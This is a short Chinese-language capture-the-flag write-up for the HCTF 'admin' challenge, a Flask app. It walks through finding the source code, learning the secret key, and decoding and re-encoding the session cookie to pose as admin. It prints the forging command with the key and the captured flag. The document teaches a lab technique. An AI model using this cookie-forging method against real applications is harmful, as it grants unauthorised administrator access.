---
Author: SuperJason
Date: 2021-01-18
---

## flag
`flag{518a6b39-0416-4b19-85d5-477975f31b6e}`

## 思路
1. 访问环境，源码提示需要管理员权限。注册admin提示账户已注册，随意注册一个test账户，在修改密码界面的源码提示了github仓库https://github.com/woadsl1234/hctf_flask/   
   ![](images/hctf-admin-1.png)
2. 源码发现利用了flask框架，加密key为ckj123，利用cookie伪造admin会话。代码和解析后的内容如下。  
```python flask_session_cookie_hack.py decode -c {session}```
```b'{"_fresh":true,"_id":{" b":"ZDA5ZDkwMjhhNWFiNTgyMGY3YmM0MzBlMDA3YWU4NTU5Nzg5YjM1OGQ0NzRhOWRmNzJlNTJlMjViMzdiZDFhMTU3Y2Q3M2NkZGQ2YWZhZTBlYmJhNzBkMDJlMjdmOTFmZjEzNTQ3YzAxZWRjNjE3ZjVlYzFmYmNmNzU1OWRmN2Y="},"csrf_token":{" b":"MDk4N2FlYWNjYTViYTkzYmZhOWNkMTMzNjVjNGZmNDZjNjA3MWNmZg=="},"image":{" b":"MlVBWA=="},"name":"test","user_id":"10"}'```
   ![](images/hctf-admin-2.png)
3. 改为admin后加密，这里通过decode得到的json数据需要适当修改一下，实际载荷如下。  
``` python .\N1BOOK\scripts\flask_session_cookie_hack.py encode -t "{'_fresh': True, '_id': b'ca73d01f58fe172c279fdb1026ba1202390ee0e60b049380c8785511afd9560104b61fa487c4bcb293fc463ef1548d3cad028ce1b5ff4922ab5246e4105a0a33', 'csrf_token': b'bcb966803bad1e8b020d5b7cf5e843fb157ef072', 'image': b'Av32', 'name': 'admin', 'user_id': '10'}" -s ckj123```
   ![](images/hctf-admin-3.png)
4. 修改cookie后，获得flag
   ![](images/hctf-admin-4.png)

## 总结
- 源码分析
- flask会话伪造